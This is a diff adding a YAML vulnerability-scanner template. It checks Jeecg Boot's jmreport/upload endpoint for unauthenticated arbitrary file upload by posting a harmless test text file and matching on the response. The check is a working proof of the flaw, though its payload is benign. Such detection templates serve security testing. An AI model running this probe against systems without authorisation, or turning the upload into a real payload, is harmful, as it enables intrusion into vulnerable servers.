@@ -1,0 +1,45 @@
+id: jeecg-boot-jmreport-fileupload
+
+info:
+  name: Jeecg Boot jmreport/upload 任意文件上传漏洞
+  author: free2e
+  severity: high
+  verified: true
+  description: |-
+    /jeecg-boot/jmreport/upload接口存在未授权任意文件上传，经实测发现上传接口未授权，但访问上传后的文件需要登录，即带token。
+  tags: jeecgboot,jmreport,fileupload
+  created: 2025/08/22
+
+set:
+  rboundary: randomLowercase(8)
+rules:
+  r0:
+    brute:
+      mode: clusterbomb
+      commit: winner
+      continue: false
+      p:
+        - /jeecg-boot/jmreport/upload
+        - /jmreport/upload
+    request:
+      method: POST
+      path: "{{p}}"
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: |
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="file"; filename="aaa.txt"
+        Content-Type: text/html
+
+        test123456
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="fileName"
+
+        aaa.txt
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="biz"
+
+        excel_online
+        ------WebKitFormBoundary{{rboundary}}--
+    expression: response.status == 200  && response.body.bcontains(b'"jimureport"')
+expression: r0()
